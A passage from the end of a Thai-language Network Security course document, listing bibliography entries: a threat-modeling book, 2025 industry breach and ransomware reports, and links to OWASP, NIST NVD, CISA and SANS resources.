13. UcedaVelez, T., & Morana, M. M. (2015). *Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis*. Wiley.

### รายงานและกรณีศึกษา
14. Verizon. (2025). *2025 Data Breach Investigations Report*.
15. IBM Security & Ponemon Institute. (2025). *Cost of a Data Breach Report 2025*.
16. ENISA. (2025). *ENISA Threat Landscape 2025*.
17. Sophos. (2025). *State of Ransomware 2025*.
18. Chainalysis. (2025). *2025 Crypto Ransomware Report*.
19. Check Point. (2025). *State of Ransomware Q3 2025*.
20. Google. (2014). *BeyondCorp: A New Approach to Enterprise Security*.

### แหล่งข้อมูลเพิ่มเติม
21. OWASP Top 10 — 2021. https://owasp.org/Top10/
22. NIST National Vulnerability Database. https://nvd.nist.gov/
23. CISA Known Exploited Vulnerabilities Catalog. https://www.cisa.gov/known-exploited-vulnerabilities-catalog
24. SANS Institute. https://www.sans.org/
25. OWASP Threat Modeling. https://owasp.org/www-community/Threat_Modeling

---

*เอกสารนี้เป็นส่วนหนึ่งของรายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569*
